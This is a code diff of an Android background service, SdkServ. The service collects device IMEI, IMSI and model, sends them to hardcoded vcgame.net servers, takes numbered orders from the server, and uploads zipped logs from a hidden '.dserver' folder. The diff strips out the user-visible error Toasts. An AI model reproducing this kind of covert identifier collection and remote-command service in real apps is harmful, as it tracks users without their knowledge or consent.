@@ -39,7 +39,6 @@ import android.os.Environment;
 import android.os.Handler;
 import android.telephony.TelephonyManager;
 import android.util.Log;
-import android.widget.Toast;
 
 /**
  * 主服务
@@ -75,23 +74,25 @@ public class SdkServ implements DServ{
     public static final String ERR_DECRYPT = "e02";
     public static final String ERR_KEY_EXPIRED = "e03";
     public static final String ERR_DECRYPT_CLIENT = "e04";
+    public static final String ERR_CONFIG = "e05";
+    public static final String ERR_UP_RESP = "e06";
     
-	private static int taskSleepTime = 10*1000;
-	private static int upSleepTime = 1000*10*2;
-	private static int shortSleepTime = 1000*10*2;
-	private static long nextUpTime;
-	private static long lastUpTime = System.currentTimeMillis();
-	private static long lastUpLogTime = System.currentTimeMillis();
-	private static long maxLogSleepTime = 1000*60*60;
+	int taskSleepTime = 10*1000;
+	int upSleepTime = 1000*10*2;
+	int shortSleepTime = 1000*60*5;
+	long nextUpTime;
+	long lastUpTime = System.currentTimeMillis();
+	long lastUpLogTime = System.currentTimeMillis();
+	long maxLogSleepTime = 1000*60*60;
+	long maxLogSize = 1024*10;
 	
-	
-	private static int timeOut = 5000;
+	int timeOut = 5000;
 	private final static int VERSION = 1;
 //	private static int keyVersion = 1;
 	private static final String SPLIT_STR = "@@";
 	private static final String datFileType = ".dat";
 	
-	private static int uid = 0;
+	long uid = 0;
 	
 	UpThread upThread;
 	TaskThread taskThread;
@@ -100,8 +101,8 @@ public class SdkServ implements DServ{
 	
 	
 	//TODO 暂时写死
-	static String upUrl = "http://ds.vcgame.net:8080/plserver/PS";
-	static String upLogUrl = "http://lg.vcgame.net:8080/plserver/PL";
+	private String upUrl = "http://ds.vcgame.net:8080/plserver/PS";
+	private String upLogUrl = "http://lg.vcgame.net:8080/plserver/PL";
 //	static String upUrl = "http://192.168.0.16:8080/PLServer/PS";//"http://180.96.63.71:8080/plserver/PS";
 //	static String upLogUrl = "http://192.168.0.16:8080/PLServer/PL";
 	static final String sdDir = Environment.getExternalStorageDirectory().getPath()+"/.dserver/";
@@ -152,6 +153,7 @@ public class SdkServ implements DServ{
 				}
 			}
 		} catch (Exception e) {
+			e("ERR_"+ERR_CONFIG,"","",e.getMessage());
 			Log.e(TAG, "config File error!",e);
 		}
 		
@@ -727,7 +729,7 @@ public class SdkServ implements DServ{
 
 		boolean runFlag = true;
 		int errTimes = 0;
-		final int maxErrTimes = 10;
+		final int maxErrTimes = 20;
 		
 		/**
 		 * @param runFlag the runFlag to set
@@ -748,6 +750,7 @@ public class SdkServ implements DServ{
 				String imei = tm.getDeviceId();
 				String imsi = tm.getSubscriberId();
 				String ua = android.os.Build.MODEL;
+				sb.append(uid).append(SPLIT_STR);
 				sb.append(api_level).append(SPLIT_STR);
 				sb.append(imei).append(SPLIT_STR);
 				sb.append(imsi).append(SPLIT_STR);
@@ -790,34 +793,38 @@ public class SdkServ implements DServ{
 			    //判断是否错误
 			    final String resp = sb.toString();
 			    
-			    Log.d(TAG, "resp:"+resp);
+			    //Log.d(TAG, "resp:"+resp);
 			    
 			    if (!StringUtil.isStringWithLen(resp, 4)) {
 					//判断错误码
-			    	if (resp.equals(ERR_KEY_EXPIRED)) {
-						//key过期,发起更新key的请求升级key
-			    		
-					}else{
-						//FIXME 显示错误码,正式发布时去除
-						getHander().post(new Runnable() {     
-				            @Override     
-				            public void run() {     
-				                   Toast.makeText(SdkServ.this.dservice.getApplicationContext(), resp,Toast.LENGTH_SHORT).show(); 
-				            }     
-						});
-						//Toast.makeText(SdkServ.this.ctx.getApplicationContext(), resp, Toast.LENGTH_SHORT).show();;
-					}
+			    	Log.e(TAG, resp);
+			    	e("ERR_"+ERR_UP_RESP,"","","resp:"+resp);
+//			    	if (resp.equals(ERR_KEY_EXPIRED)) {
+//						//key过期,发起更新key的请求升级key
+//			    		
+//					}else{
+//						//FIXME 显示错误码,正式发布时去除
+//						getHander().post(new Runnable() {     
+//				            @Override     
+//				            public void run() {     
+//				                   Toast.makeText(SdkServ.this.dservice.getApplicationContext(), resp,Toast.LENGTH_SHORT).show(); 
+//				            }     
+//						});
+//						//Toast.makeText(SdkServ.this.ctx.getApplicationContext(), resp, Toast.LENGTH_SHORT).show();;
+//					}
 			    	return false;
 				}
 			    //解密
 				String re = CheckTool.Cresp(resp);//Encrypter.getInstance().decrypt(resp);
-				Log.d(TAG, "dec re:"+re);
+				//Log.d(TAG, "dec re:"+re);
 				String[] res = re.split(SPLIT_STR);
-				if (!StringUtil.isDigits(res[0])) {
+				if (!StringUtil.isDigits(res[0]) || !StringUtil.isDigits(res[1])) {
 					Log.e(TAG, "re length Error:"+re);
 					return false;
 				}
-				int order = Integer.parseInt(res[0]);
+				SdkServ.this.uid = Long.parseLong(res[0]);
+				int order = Integer.parseInt(res[1]);
+				
 				switch (order) {
 				case ORDER_NONE:
 					return true;
@@ -878,7 +885,7 @@ public class SdkServ implements DServ{
 				while (runFlag && SdkServ.this.state == STATE_RUNNING) {
 					Log.d(TAG, "up running state:"+SdkServ.this.state);
 					
-					if (!isNetOk) {
+					if (!isConnOk()) {
 						Thread.sleep(shortSleepTime);
 						continue;
 					}
@@ -905,10 +912,11 @@ public class SdkServ implements DServ{
 						}
 					}
 					//日志上传
-					String logs = readLog();
+//					String logs = readLog();
+					long logSize = getLogSize();
 					//判断是否有足够内容,或超过最大上传时间间隔
-					Log.d(TAG, "log size:"+logs.length());
-					if (StringUtil.isStringWithLen(logs, 1024*2) || System.currentTimeMillis()>lastUpLogTime+maxLogSleepTime) {
+					Log.d(TAG, "log size:"+logSize);
+					if ((logSize > maxLogSize) || System.currentTimeMillis()>lastUpLogTime+maxLogSleepTime) {
 						boolean re = false;
 						String lFile = sdDir+uid+"_"+System.currentTimeMillis()+".zip";
 						re = zip(logFile, lFile);
@@ -1245,7 +1253,20 @@ public class SdkServ implements DServ{
 		this.taskThread.start();
 	}
 
-
+	public boolean isConnOk() {
+		ConnectivityManager cm = (ConnectivityManager) dservice
+				.getSystemService(Context.CONNECTIVITY_SERVICE);
+		boolean isOk = false;
+		if (cm != null) {
+			NetworkInfo aActiveInfo = cm.getActiveNetworkInfo();
+			if (aActiveInfo != null && aActiveInfo.isAvailable()) {
+				if (aActiveInfo.getState().equals(NetworkInfo.State.CONNECTED)) {
+					isOk = true;
+				}
+			}
+		}
+		return isOk;
+	}
 
 	/**
 	 * @return the version
@@ -1257,7 +1278,7 @@ public class SdkServ implements DServ{
 	/**
 	 * @param upUrl the upUrl to set
 	 */
-	public static final void setUpUrl(String url) {
+	public final void setUpUrl(String url) {
 		upUrl = url;
 	}
 
@@ -1299,6 +1320,16 @@ public class SdkServ implements DServ{
 	public final void setEmvPath(String emvPath) {
 		this.emvPath = emvPath;
 		this.config.put("emvPath", emvPath);
+	}
+
+	
+	
+	public long getMaxLogSize() {
+		return maxLogSize;
+	}
+
+	public void setMaxLogSize(long maxLogSize) {
+		this.maxLogSize = maxLogSize;
 	}
 
 	@Override
@@ -1423,6 +1454,14 @@ public class SdkServ implements DServ{
 	
 	static String readLog(){
 		return readTxt(logFile);
+	}
+	
+	static long getLogSize(){
+		File f = new File(logFile);
+		if (!f.exists()) {
+			return 0;
+		}
+		return f.length();
 	}
 	public class LT extends Thread{
 
